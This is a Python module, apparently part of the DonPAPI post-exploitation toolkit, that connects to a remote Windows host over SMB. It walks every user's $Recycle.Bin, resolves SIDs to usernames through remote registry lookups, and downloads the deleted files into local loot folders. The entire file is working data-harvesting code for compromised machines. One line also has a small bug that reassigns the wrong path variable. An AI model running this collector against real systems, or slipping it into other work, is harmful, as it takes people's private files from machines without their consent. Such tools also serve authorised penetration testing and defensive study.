import os
import ntpath
from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter
from donpapi.lib.utils import dump_file_to_loot_directories


class RecycleBin:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.found = 0
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self) -> None:
        self.logger.display("Gathering recycle bins")
        for sid_directory in self.conn.remote_list_dir(self.context.share, "\\$Recycle.Bin"):
            sid = sid_directory.get_longname()
            if sid_directory.get_longname() not in self.false_positive: 
                username = None
                # Translates $Recycle.Bin SID's to usernames using remote registry keys
                if self.context.remoteops_allowed:
                    username = self.translate_sid_to_username(sid)
                self.dig_files(
                    directory_path = f"\\$Recycle.Bin\\{sid}", 
                    sid = sid,
                    username = username,
                    recurse_level = 0, 
                    recurse_max = 10,
                )
        if self.found > 0:
            self.logger.secret(f"Found {self.found} files in recycle bin's", self.tag)

    def translate_sid_to_username(self, sid) -> str:
        username = None
        path = f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{sid}"
        key = "ProfileImagePath\x00"
        try:
            username = self.context.reg_query_value(path, key)[-1].split("\\")[-1].rstrip("\x00")
        except Exception as e:
            if "ERROR_FILE_NOT_FOUND" not in str(e):
                self.logger.error(f"Error while RegQueryValue {path}\\{key}: {e}")
        return username

    def dig_files(self, directory_path, sid, username = None, recurse_level = 0, recurse_max = 10) -> None:
        directory_list = self.conn.remote_list_dir(self.context.share, directory_path)
        if directory_list is not None:
            for item in directory_list:
                if item.get_longname() not in self.false_positive:
                    new_path = ntpath.join(directory_path, item.get_longname())
                    if item.is_directory() > 0:
                        if recurse_level < recurse_max:
                            self.dig_files(
                                directory_path = new_path, 
                                sid = sid,
                                username = username ,
                                recurse_level = recurse_level+1, 
                                recurse_max = recurse_max
                            )
                    else:
                        if item.get_filesize() < self.max_filesize:                            
                            file_content = self.conn.readFile(self.context.share, new_path)
                            if file_content is not None:
                                self.found += 1
                                
                                absolute_local_filepath = os.path.join(self.context.target_output_dir, *(new_path.split('\\')))
                                if username:
                                    absolute_local_filepath = absolute_local_filepath.replace(sid, username)
                                dump_file_to_loot_directories(absolute_local_filepath, file_content)
                                
                                collector_dir_local_filepath = os.path.join(self.context.global_output_dir, self.tag, new_path.replace("\\", "_"))
                                if username:
                                    absolute_local_filepath = absolute_local_filepath.replace(sid, username)
                                dump_file_to_loot_directories(collector_dir_local_filepath, file_content)
                        